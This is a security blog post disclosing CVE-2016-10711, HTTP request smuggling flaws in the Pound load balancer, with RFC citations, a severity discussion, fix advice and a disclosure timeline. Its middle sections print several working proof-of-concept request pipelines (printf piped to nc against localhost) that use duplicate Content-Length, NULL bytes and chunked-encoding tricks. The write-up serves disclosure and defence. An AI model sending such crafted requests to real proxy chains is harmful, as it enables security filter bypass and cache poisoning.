<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title> Security: HTTP Smuggling, Apsis Pound load balancer |  RBleug</title>
    <meta name="description" content="Regilero's blog; Mostly tech things about web stuff."/>
    <meta name="author" content="regilero"/>
    <link rel="author" href="/contact/" title="who am I?" type="text/html" />
    <link rel="icon" type="image/x-icon" href="/theme/img/regilero.ico" />
    <link rel="shortcut icon" type="image/x-icon" href="/theme/img/regilero.ico" />
    <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="/feed.xml" />
    <link rel="stylesheet" href="/theme/bootstrap/css/bootstrap.min.css" type="text/css">
    <link rel="stylesheet" href="/theme/bootstrap/css/bootstrap-theme.min.css" type="text/css">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
<!--
    <link rel="stylesheet" href="/theme/blueprint/screen.css" type="text/css" media="screen, projection">
    <link rel="stylesheet" href="/theme/blueprint/print.css" type="text/css" media="print">
    <link rel="stylesheet" href="/theme/syntax.css" type="text/css" />
    <!--[if lt IE 8]>
      <link rel="stylesheet" href="/theme/blueprint/ie.css" type="text/css" media="screen, projection">
    <![endif]-->
<!--
    <link rel="stylesheet" href="/theme/blueprint/plugins/link-icons/screen.css" type="text/css" media="screen, projection">
    <link rel="stylesheet" href="/theme/fontello/css/fontello.css">
    <!--[if IE 7]><link rel="stylesheet" href="/theme/fontello/css/fontello-ie7.css"><![endif]-->
    <link href="/theme/syntax.css" rel="stylesheet" type="text/css" />
    <link href="/theme/style.css" rel="stylesheet" type="text/css" />

  </head>
  <body>
    <div class="topNav navbar navbar-inverse navbar-static-top" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand visible-xs-inline" href="#">Navigation</a>
        </div>
        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li ><a href="/" class="glyphicon glyphicon-home">&nbsp;Home</a></li>
            <li ><a href="/archives/" class="glyphicon glyphicon-th">&nbsp;Archives</a></li>
            <li ><a href="/contact/" class="glyphicon glyphicon-earphone">&nbsp;Contact</a></li>
            <li><a class="glyphicon glyphicon-eye-open" href="/feed.xml">&nbsp;RSS Feed</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </div>

  <div class="container" role="main">
  
    <div class="jumbotron">
      <div class="container">
         <div id="branding">
           <h1 class="logo"><a href="/">RBleug</a></h1>
           <hr/>
           <h2 class="alt">Regilero's blog; Mostly tech things about web stuff.</h2>
         </div>
       </div>
     </div>

    <div class="row">
      <div class="col-md-8" id="left-content">

          <article>
        <header>
            <div class="page-header">
            <h1>Security: HTTP Smuggling, Apsis Pound load balancer
            <br/><span><i class="glyphicon glyphicon-time">&nbsp;</i><time datetime="2018-07-03">Jul 03, 2018</time></span>
            <span class="category"><i class="glyphicon glyphicon-list">&nbsp;</i> <a href="/Security/">Security</a> and <a href="/english/">english</a></span>
            </h1>
            </div>
        </header>

        <div class="entry">
         <div class="col-md-6">
          <div class="post-excerpt-full">
          details of CVE-2016-10711 (published feb 2018).
          </div>
          <div id="post-toc">
          </div>
         </div>
         <div class="col-md-6">
          <img class="topimg" src="/theme/img/pic/old1.jpg" alt="details of CVE-2016-10711 (published feb 2018)." title="details of CVE-2016-10711 (published feb 2018)." />
         </div>
         <div class="row">
          <div class="col-md-12" id="post-full">
       
          <p><small><strong>English version</strong> (<strong>Version Française</strong> disponible sur <a href="https://www.makina-corpus.com/blog/metier/2018/contrebande-de-http-smuggling-load-balancer-apsis-pound">makina corpus</a>).</small>
<small>estimated read time: 15min</small></p>

<h2>Pound?</h2>

<p><a href="http://www.apsis.ch/pound/">Pound</a> is an Open Source HTTP load balancer, usually used as an SSL/TLS terminator
(handling https and certificate in front of a more classical http backend).
Back in time it was a simple and efficient way of adding SSL for a website.</p>

<p>If you check <a href="http://www.apsis.ch/pound/">the official website</a> you'll see pound decribed as a load balancer, a reverse proxy, an SSL wrapper but also a <strong>sanitizer</strong>:</p>

<blockquote><p>an HTTP/HTTPS sanitizer: Pound will verify requests for correctness and accept only well-formed ones.</p></blockquote>

<p>The project activity has been slowing down and this last CVE published in early 2018
may have triggered some warnings about the project activity.
The Debian project removed the package, not only because of that CVE, where <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=888786">a patch was available</a>,
from <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=891248">this discussion</a> it appears that compatibility with new versions of
openSSL and the lack of activity on the project contributed greatly to the decision.</p>

<h2> Fixed versions of Pound</h2>

<p>If we check the <a href="https://tracker.debian.org/pkg/pound">Debian status page</a> for this package today (2018-07-03) we have a warning that the package has been removed because it cannot be find in any development repository, and 3 actions : outdated version, 1 ignored security issue in stretch (stable) and one in jessie (oldstable).
From my own test I cannot install it on jessie, but on stretch I'm still able to install it, with the security issues inside.</p>

<p>If you use a Suse package you have the <a href="https://lists.opensuse.org/opensuse-updates/2018-02/msg00024.html">security updates</a> available.</p>

<p>On the <a href="http://www.apsis.ch/pound/">official project page</a> the officiel stable version is now Pound-2.8 and contains the fix.
The first fixed version was 2.8a (experimental), and there was a very long time for which only this experimental version was available.</p>

<p>The source code diff for version 2.8 is not very big: (<a href="https://fossies.org/diffs/Pound/2.7_vs_2.8/http.c-diff.html">fossies1</a> | <a href="https://fossies.org/diffs/Pound/2.7_vs_2.8/http.c-diff.html">fossies2</a>  | <a href="https://fossies.org/diffs/Pound/2.7_vs_2.8/config.c-diff.html">fossies3</a>).
It contains some feature removal (dynamic scaling) and security syntax filters on HTTP Smuggling issues.
That's the interesting part.</p>

<h2>CVE-2016-10711</h2>

<p>The <a href="https://www.cvedetails.com/cve/CVE-2016-10711/">official CVE description</a> is:</p>

<blockquote><p>Apsis Pound before 2.8a allows request smuggling via crafted headers</p></blockquote>

<p>Most of the issues are in fact <strong>very common mistakes</strong> with HTTP parsers (with
some specific rare issues also, like NULL character handling). Or I should say
it <strong>was common</strong> before 2005 and before <a href="https://tools.ietf.org/html/rfc7230">RFC 7230</a>. In the past years
I have reported similar issues in a lot of projects, small ones, and sometimes
bigger ones, so it could be interesting to study some of these <em>'crafted headers'</em>.</p>

<p>Note that, as explained later, Pound, being an SSl terminator, is not the most
critical piece in a smuggling attack. Performing such attacks on a reverse proxy
cache, or a common HTTP server, is more valuable for an attacker. But the whole
'HTTP Smuggling attacks' paradigm is based on chaining syntax errors on multiple
actors, so everyone should detect the strange <em>crafted headers</em> and behave properly.</p>

<h3>1- Double content-length support:</h3>

<p>Any request with 2 <code>Content-Length</code> headers <strong>MUST</strong> be rejected.</p>

<p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.2">RFC7230 section 3.3.2</a></p>

<blockquote><p>If a message is received that has multiple Content-Length header
fields with field-values consisting of the same decimal value, or a
single Content-Length header field with a field value containing a
list of identical decimal values (e.g., "Content-Length: 42, 42"),
indicating that duplicate Content-Length header fields have been
generated or combined by an upstream message processor, then the
recipient MUST either reject the message as invalid or replace the
duplicated field-values with a single valid Content-Length field
containing that decimal value prior to determining the message body
length or forwarding the message.</p></blockquote>

<p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a></p>

<blockquote><p>If a message is received without Transfer-Encoding and with
either multiple Content-Length header fields having differing
field-values or a single Content-Length header field having an
invalid value, then the message framing is invalid and the
recipient MUST treat it as an unrecoverable error.  If this is a
request message, the server MUST respond with a 400 (Bad Request)
status code and then close the connection.</p></blockquote>

<p>For Pound, If you send a request with:</p>

<pre><code>Content-Length: 0
Content-Length: 147
</code></pre>

<p>Result is <code>Size of Body = 0</code></p>

<p>If you send one with:</p>

<pre><code>Content-Length: 147
Content-Length: 0
</code></pre>

<p>Result is <code>Size of Body = 147</code></p>

<p>The only official result should be <strong>an error</strong>. If a previous actor in the HTTP
communication contains the same flaw, but inverted, You have an easy smuggling factor.
We will see below some example of HTTP pipelines exploits, the goal is usually
to have a size which differs, one actor is seing 3 requests, another actor thinks
there's only 2.</p>

<h3>2) Chunks priority on Content-Length</h3>

<p>Here we have again the <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a>, but another point:</p>

<blockquote><p>If a message is received with both a Transfer-Encoding and a
Content-Length header field, the Transfer-Encoding overrides the
Content-Length. Such a message might indicate an attempt to
perform request smuggling (Section 9.5) or response splitting
(Section 9.4) and ought to be handled as an error.</p></blockquote>

<p>So the rule is that you can reject the message (this is now the case in
most servers), but at least, if you do not reject the message the
chunked transmission has the priority on any Content-Length headers.</p>

<p>With Pound the rule was the first header read has the priority. Bad.</p>

<p>Let's see an example. Here I have Pound Server listening on HTTP port 8080 on 127.0.0.1. (So without HTTPS support, but believe me in HTTPS mode all the attacks works the same, you can even use openssl_client instead of netcat to push some printf output on it). Behind that Pound talks to an HTTP server (the backend), on any other port.</p>

<ul>
<li>I use <code>printf</code> to render my HTTP queries, I do not use curl or wget, because I want full control on all characters.</li>
<li>I <strong>chain all the queries</strong> in one single string, I do not wait for responses between each queries, that's called an <strong>HTTP pipeline</strong>, without pipelining support on the server (here Pound) I cannot do anything</li>
<li>I send this string (of HTTP queries) to netcat (command <code>nc</code>) which is a very low level command which simply controls the tcp/ip connection to the targeted IP and port.</li>
<li>this is the same as sending an HTTP query with a browser or with curl, but I have full control on nasty crafted headers</li>
<li>the attacker goal is to send messages that could contain a different number of queries if it is read by a valid parser or an invalid one, that's the <strong>technical goal</strong>. The functionnal goal of this is security filter bypass or cache poisoning, or some more complex stuff, but like an <code>alert()</code> for XSS, which is just a technical proff and not a functionnal attack, if you have the wrong number of valid responses, there's a security issue.</li>
<li>If you try it on a test environment you should track the requests sent by Pound on your backend, use Wireshark for example. Each request of the pipeline will be send individually to the backend, not in a pipeline.</li>
</ul>


<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 2 responses instead of 3</span>
<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Content-length:56\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;0\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tmp HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>

<p>For a <strong>valid parser</strong> there are 3 queries:</p>

<p>First one:</p>

<pre><code>GET / HTTP/1.1[CRLF]
Host:localhost[CRLF]
**Content-length:56[CRLF]** (ignored and usually not send back to the backend)
Transfer-Encoding: chunked[CRLF]
Dummy:Header[CRLF]
[CRLF]
0[CRLF]  (end of chunks -&gt; end of message)
[CRLF]
</code></pre>

<p>Second one:</p>

<pre><code>GET /tmp HTTP/1.1[CRLF]
Host:localhost[CRLF]
Dummy:Header[CRLF]
</code></pre>

<p>And third one:</p>

<pre><code>GET /tests HTTP/1.1[CRLF]
Host:localhost[CRLF]
Dummy:Header[CRLF]
</code></pre>

<p>For an <strong>invalid parser</strong> (here Pound) there's only 2 queries and the first one is:</p>

<pre><code>GET / HTTP/1.1[CRLF]
Host:localhost[CRLF]
Content-length:56[CRLF]
**Transfer-Encoding: chunked[CRLF]** (ignored and removed, hopefully)
Dummy:Header[CRLF]
[CRLF]
0[CRLF]  (start of 56 bytes of body)
[CRLF]
GET /tmp HTTP/1.1[CRLF]
Host:localhost[CRLF]
Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)
</code></pre>

<h3>3) Bad chunked transmission</h3>

<p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3</a></p>

<blockquote><p>If a Transfer-Encoding header field
is present in a request and the chunked transfer coding is not
the final encoding, the message body length cannot be determined
reliably; the server MUST respond with the 400 (Bad Request)
status code and then close the connection.</p></blockquote>

<p>Using <code>Transfer-Encoding: chunked, zorg</code> we did not have the error 400.</p>

<h3>4) NULL in headers -> concatenation</h3>

<p>That's an original issue, a rare one (but the NULL character is always fun to test).</p>

<p>Like most HTTP servers Pound is written in C, and C string ends with the NULL character (<code>\0</code>).
Finding a NULL character in an HTTP request (not the body part) should render an error,
but sometimes the parser does not detect the NULL character because the parsed line was wrongly interpreted as a C string.</p>

<p>With Pound as soon as a NULL character was encountered in an header line the parser would continue the header with the next line.</p>

<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Content-\0dummy: foo\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;length: 56\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;0\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tmp HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>

<p>Here is another variation using the Double Content-length Support. This could be
used if the previous actor in the chain of proxies had no support for double
Content-Length (very likely).. but had support for NULL characters (less likely).</p>

<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Content-\0dummy: foo\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;length: 51\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Content-length: 0\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tmp HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>

<p>On each attack we 2 responses instead of 3, you can also make 3 responses instead of 2.</p>

<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># 3 responses instead of 2 (2nd query is unmasked by pound)</span>
<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Transfer-\0Mode: magic\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Encoding: chunked\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Content-length: 57\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;0\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tmp/ HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>

<p>And if you are still here you can compare the last two examples.
On the first one we try a bad chunked transmission, and on the last one we use the <code>ops-fold</code> syntax.
Use wireshark to compare the behaviors and some potential <em>crafted headers</em> syntax transmitted to backends.</p>

<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># chunk mode not applied</span>
<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Transfer-\0Mode: magic\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Encoding: chunked,zorg\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Content-length: 57\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;0\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tmp/ HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>

<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c1"># chunk mode applied, and &#39;\r\n zorg\r\n&#39; ops-fold transmitted</span>
<span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Transfer-\0Mode: magic\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Encoding: chunked\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39; zorg\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Content-length: 57\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;0\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tmp/ HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>

<h3>5) Transmission issues</h3>

<p>This strange ops-fold syntax transmitted could be a problem. This was removed in version 2.8.
Usually the Reverse proxy which support ops-fold are not transmitting the syntax (everything back on one line).</p>

<p>They were other transmission issues like this one (sadly not fixed):</p>

<p><figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET / HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Dummy:Header\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;0000000000000000000000000000042\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;GET /tmp/ HTTP/1.1\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Host:localhost\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;0\r\n&#39;</span><span class="se">\</span>
<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
<span class="p">|</span> nc -q3 127.0.0.1 8080</code></pre></figure></p>

<p>This is not an invalid query. The first chunk size is <code>42</code> in hexa, so 66 bytes.
The second chunk is the end-of-chunks marker, the last 2 lines <code>0\r\n\r\n</code>.
The <code>GET /tmp/</code> query does not exists, it's just some uninterpreted bytes in the first chunk body of 66 bytes.</p>

<p>But if you use wireshark you will detect that this message is transfered as-is,
the <code>0000000000000000000000000000042</code> is not rewitten as <code>42</code> or <code>042</code>.
That's still officially not an issue. The problem is that this syntax is sometimes
an issue for some backends (chunk size attribute truncation issues) where
you may read this <code>0000000000000000000000000000042</code> as <code>00000000000000000</code> and wrongly detect it
as an end-of-chunks marker. And then discover the (false) <code>GET /tmp/</code> query.</p>

<p>Of course the security issue here is on the backend, not Pound. But <strike>shi</strike>things happens.</p>

<p>Some other transmissions issues were fixed, like these strange syntax:</p>

<pre><code>GET /url?foo=[SOMETHING]HTTP/0.9 HTTP/1.1\r\n
or
GET /url?foo=[SOMETHING]Host:example.com, HTTP/1.1\r\n
</code></pre>

<p>with [SOMETHING] = BACKSPACE or CR or BEL or FORMFEED or HTAB or VTAB.</p>

<h2>Severity</h2>

<p>Bad HTTP syntax parsing is a security issue, the main problem is that any bad
HTTP actor in a network of HTTP actors becomes the hammer and previous actors
becomes nails.</p>

<p>The actor which suffers from Request splitting is the one which wrongly read a garbage body and extract a query from it.
No other preceding actor could filter this query before because it was just a body (security filter bypass).
And No one is expecting this query response (cache poisoning, etc.).</p>

<p>That's why the RFC has some minimal requirements on syntax parsing around message size.</p>

<p>On most installations Pound will be the SSL terminator, usually the <strong>first server side actor</strong> in the chain.</p>

<p>In this position the request splitting attacks are hard to exploit, maybe it could be used to poison a Forward proxy on client side, maybe.
But it cannot be used to attack the backends.</p>

<pre><code>_____________________________              _________________________________
|      Client Side          |              |     Server Side               |
Browser ---&gt; Forward proxy ------Internet---&gt; Pound ---&gt; Varnish ---&gt; Nginx
                    NAIL? &lt;================== HAMMER?
                                              NAIL? &lt;==== HAMMER?
</code></pre>

<p>Maybe some other HTTPS load balancers are present in front of Pound, on some big installations,
that would be more dangerous as Pound could be used to send some extra responses to these proxys (WAFs?).</p>

<p>But on this position the most effective issues, on an attacker point of view,
are transmission issues, where bad crafted headers are transmitted to backends by Pound. Because <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-2086">on</a> <a href="http://dev.eclipse.org/mhonarc/lists/jetty-announce/msg00123.html">the</a> <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-6816">backends</a> <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-8743">you</a> <a href="https://trac.nginx.org/nginx/ticket/762">could</a> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-8852">have</a> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3183">some</a> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-5739">issues</a> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-5740">and</a> it's always a bad idea to send bad queries to backends.</p>

<p>If you look at the two main errors, Double Content Length and no respect of chunked priority, it is more dangerous on a backend than on a front.
This, in my mind, reduces the impact of exploitations of these issues. I may be wrong. But transmissions issues,
which are more dangerous for the ecosystem, are usually not even considered as security issues,
because the Proxy is not doing any splitting, just forwarding some dangerous syntax.</p>

<h2>I use Pound, what can I do?</h2>

<p>First of all you can use Pound 2.8. Or a 2.7.x with the patchs.</p>

<p>If the fixed package is not available on your distribution you can <strong>easily</strong> compile Pound 2.8. I made several compilations of Pound on jessie and stretch docker environements without any complexity (configure/make/make install).</p>

<p>Then you can also follow the Debian team and check for more active alternatives. <a href="http://www.haproxy.org/">Haproxy</a> for example.</p>

<h2>Timeline</h2>

<ul>
<li>2016-09-05: reports to project maintainers</li>
<li>2016-09-08: some more reports</li>
<li>2016-10-23: version 2.8a (experimental) <a href="http://www.apsis.ch/pound/pound_list/archive/2016/2016-10/1477235279000">published</a>, with all the fixs, <em>request smuggling</em> is used in the announce, not the word <em>security</em></li>
<li>2018-01-15: asking project maintainer for CVE. Yes, quite late, I'm not always working on this subject :-)</li>
<li>2018-01-29: CVE Id reserved by me and transfered to the vendor</li>
<li>2018-02-13: pound fixed On <a href="https://lists.debian.org/debian-lts-announce/2018/02/msg00015.html">debian7 Wheezy (old)</a>, patch proposed <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=888786">for jessie and stretch</a>.</li>
<li>2018-02-24: pound removed from Debian unstable</li>
<li>2018-05-11: Pound <a href="http://www.apsis.ch/pound/pound_list/archive/2018/2018-05/1526034164000#1526034164000">2.8 released</a></li>
<li>2018-07-03: this page</li>
</ul>


<h2>See also</h2>

<ul>
<li>Video <a href="https://www.youtube.com/watch?v=dVU9i5PsMPY">Defcon HTTP Smuggling</a></li>
<li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf">Defcon support</a></li>
<li>Video <a href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI">Defcon demos</a></li>
</ul>



          </div>
         </div>
        </div>
        <div class="tag">Tags:&nbsp;<i class="glyphicon glyphicon-tag"></i><a href="/tag/CVE/">CVE</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/HTTP/">HTTP</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/Pound/">Pound</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/Security/">Security</a>, <i class="glyphicon glyphicon-tag"></i><a href="/tag/Smuggling/">Smuggling</a></div>
</article>
<hr/>
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: * * */
    var disqus_shortname = "regilero";
    var disqus_identifier = '9dchfg-ebb4-2cdfe-586dcaa665ecec50f0';
    var disqus_title = "Security: HTTP Smuggling, Apsis Pound load balancer";
    var disqus_url = 'http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/';

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

    

      </div>
      <div class="col-md-4" id="sideBar">

            <div id="sideBarContent"> 
              
              <div class="sideBarListBox">
                <div class="page-header">
                <h3>Related posts</h3>
                </div>
                <div class="list-group" role="navigation">
                  
